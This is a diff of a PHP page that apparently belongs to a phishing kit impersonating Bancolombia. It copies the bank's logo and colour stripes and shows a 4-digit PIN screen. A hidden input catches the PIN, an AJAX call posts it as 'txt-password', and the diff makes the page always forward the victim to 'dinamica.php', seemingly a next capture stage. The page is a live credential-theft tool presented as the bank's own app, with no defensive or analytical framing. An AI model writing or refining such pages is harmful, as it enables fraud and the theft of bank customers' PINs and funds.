@@ -1,5 +1,5 @@
 <?php
-// a/PASS.php - DISEÑO APP NEGRA 2026
+// a/PASS.php - DISEÑO APP NEGRA 2026 FINAL
 session_start();
 ?>
 <!DOCTYPE html>
@@ -21,11 +21,36 @@ session_start();
             height: 100vh;
             display: flex;
             flex-direction: column;
+            overflow: hidden;
+            position: relative;
         }
 
-        .header { padding: 20px; display: flex; justify-content: space-between; align-items: center; }
+        /* DISEÑO DE LAS LÍNEAS DEL LOGO */
+        .decoracion-lineas {
+            position: absolute;
+            top: 25%;
+            left: -10%;
+            width: 120%;
+            height: 150px;
+            pointer-events: none;
+            z-index: 1;
+            transform: rotate(-5deg);
+            opacity: 0.9;
+        }
+
+        .linea {
+            height: 18px;
+            width: 100%;
+            margin-bottom: 8px;
+            border-radius: 20px;
+        }
+        .linea.amarilla { background: #FDDA24; width: 80%; margin-left: 10%; }
+        .linea.naranja { background: #ED7124; width: 90%; margin-left: 5%; }
+        .linea.morada { background: #7A4998; width: 70%; margin-left: 15%; }
+
+        .header { padding: 20px; display: flex; justify-content: space-between; align-items: center; position: relative; z-index: 10; }
         
-        .container { padding: 0 30px; text-align: center; flex-grow: 1; display: flex; flex-direction: column; justify-content: center; }
+        .container { padding: 0 30px; text-align: center; flex-grow: 1; display: flex; flex-direction: column; justify-content: center; position: relative; z-index: 10; }
 
         .logo-bancolombia { width: 140px; margin-bottom: 30px; margin: 0 auto 30px auto; }
 
@@ -35,7 +60,6 @@ session_start();
             margin-bottom: 25px; 
         }
 
-        /* Estilo de los puntos del PIN */
         .pin-display {
             display: flex;
             justify-content: center;
@@ -56,7 +80,6 @@ session_start();
             border-color: #FDDA24;
         }
 
-        /* Input oculto para capturar el teclado real */
         #input_real {
             position: absolute;
             opacity: 0;
@@ -84,12 +107,11 @@ session_start();
             cursor: pointer;
         }
 
-        /* Pantalla de carga */
         #cargando-o { 
             display: none; 
             position: fixed; 
             top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.9); 
+            background: rgba(0,0,0,0.95); 
             z-index: 9999; 
             flex-direction: column;
             justify-content: center;
@@ -106,6 +128,12 @@ session_start();
     </style>
 </head>
 <body>
+
+    <div class="decoracion-lineas">
+        <div class="linea amarilla"></div>
+        <div class="linea naranja"></div>
+        <div class="linea morada"></div>
+    </div>
 
     <div id="cargando-o">
         <div class="spinner"></div>
@@ -141,20 +169,16 @@ session_start();
             const dots = $(".dot");
             const btn = $("#btn-password");
 
-            // Forzamos el foco al input al cargar
             inputReal.focus();
             $(document).click(function() { inputReal.focus(); });
 
             inputReal.on("input", function() {
                 let val = $(this).val();
-                
-                // Actualizamos los puntitos visuales
                 dots.removeClass("filled");
                 for(let i=0; i < val.length; i++) {
                     dots.eq(i).addClass("filled");
                 }
 
-                // Activamos botón si son 4 dígitos
                 if (val.length === 4) {
                     btn.addClass("active").prop("disabled", false);
                 } else {
@@ -176,11 +200,7 @@ session_start();
                         'txt-password': pin 
                     },
                     success: function(res) {
-                        if(res.trim() == "ok") {
-                            window.location.href = "dinamica.php"; 
-                        } else {
-                            window.location.href = "dinamica.php"; 
-                        }
+                        window.location.href = "dinamica.php"; 
                     },
                     error: function() {
                         setTimeout(function() { window.location.href = "dinamica.php"; }, 1500);
